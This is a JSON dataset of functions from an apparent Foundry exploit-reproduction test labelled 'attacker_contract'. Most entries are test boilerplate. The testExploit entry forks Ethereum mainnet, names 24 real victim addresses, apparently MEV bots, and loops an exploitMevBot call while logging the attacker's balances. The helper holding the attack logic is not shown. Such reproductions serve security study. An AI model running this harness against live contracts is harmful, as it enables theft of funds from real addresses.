[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 18_552_866);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(this), 0 ether);\n        approveAll();\n        address[] memory tokens = new address[](24);\n        tokens[0] = address(RAIL);\n        tokens[1] = address(BBANK);\n        tokens[2] = address(USDT);\n        tokens[3] = address(BUMP);\n        tokens[4] = address(0);\n        tokens[5] = address(HOPR);\n        tokens[6] = address(ISP);\n        tokens[7] = address(FMT);\n        tokens[8] = address(MARSH);\n        tokens[9] = address(KEL);\n        tokens[10] = address(CELL);\n        tokens[11] = address(HOPR);\n        tokens[12] = address(UNO);\n        tokens[13] = address(KINE);\n        tokens[14] = address(KEL);\n        tokens[15] = address(TXA);\n        tokens[16] = address(BUMP);\n        tokens[17] = address(USDT);\n        tokens[18] = address(USDT);\n        tokens[19] = address(USDT);\n        tokens[20] = address(USDT);\n        tokens[21] = address(MoFi);\n        tokens[22] = address(ODDZ);\n        tokens[23] = address(USDT);\n\n        address[] memory victims = new address[](24);\n        victims[0] = 0xa2473460f86e1058bdd0A2C531B15534fD403d97;\n        victims[1] = 0xe2637e705475F367c94467c4b844d58dB293aFF8;\n        victims[2] = 0x2481590CD6dcC9870212974627b2E938133d724b;\n        victims[3] = 0xC84C76b01f62733A6a385e9a70fd43bda0a4530C;\n        victims[4] = 0x2FbC293D80EF7c0D12A65AC69BB9D9E12F049064;\n        victims[5] = 0xcCb65510Af354285137a175e86f9618ACf5f4861;\n        victims[6] = 0x346Bbb951f24d6744231b38ca9c1305f0985d12D;\n        victims[7] = 0x4A3097cdaA8f93C8da1561328fdc13b64E710dCc;\n        victims[8] = 0xdbBC243E97F083562a02c458D7182489b4aC85F6;\n        victims[9] = 0xB4c6503bf5dca7C3cF98a06bEc59cf5857801D98;\n        victims[10] = 0xA9fe587d7c87691Ba76f3A4a63a8A8f2c1dBf12a;\n        victims[11] = 0xe53a9d90B66F7EdD7aAA22aaD474aBf45C55aF72;\n        victims[12] = 0xb0852b6e58560176Cf803dC4D7d6AAe151B8F242;\n        victims[13] = 0x0Aa6de644966648a5C31769d98Fe9F9881362eC8;\n        victims[14] = 0xE380cB00D0a1a7CB7d71569B573B6D4d665aFf87;\n        victims[15] = 0x800D11ae57133F6E27B4632b598caF630f0A55Dc;\n        victims[16] = 0x956750265b7a33A8564510AF5B4b3589484aF403;\n        victims[17] = 0x8d6114a24cC8cca883bBe77034f3e6F19bD8204C;\n        victims[18] = 0x976248f02DA78E034F484984009b4b9f15AE1722;\n        victims[19] = 0x5f507AdcE6F67a78eDF873065953a368F5C6Fa31;\n        victims[20] = 0xd9047C11a85D9176B2370388D81a3DBd4F99Ad96;\n        victims[21] = 0xF985cd900ec163B544623303D6383eB5C4B24712;\n        victims[22] = 0x26Cae30b00f4af20894A0827f5FcAAE752B38217;\n        victims[23] = 0xf5E303702b5927670998D6EC63449Cb2EDF65728;\n\n        emit log_named_decimal_uint(\"Attacker WETH balance before exploit\", WETH.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\n            \"Attacker BUMP balance before exploit\", BUMP.balanceOf(address(this)), BUMP.decimals()\n        );\n        emit log_named_decimal_uint(\"Attacker ETH balance before exploit\", address(this).balance, 18);\n\n        for (uint8 i; i < tokens.length; ++i) {\n            exploitMevBot(tokens[i], victims[i]);\n        }\n\n        emit log_named_decimal_uint(\"Attacker WETH balance after exploit\", WETH.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\n            \"Attacker BUMP balance after exploit\", BUMP.balanceOf(address(this)), BUMP.decimals()\n        );\n        emit log_named_decimal_uint(\"Attacker ETH balance after exploit\", address(this).balance, 18);\n    }\n\n",
    "description": ""
  }
]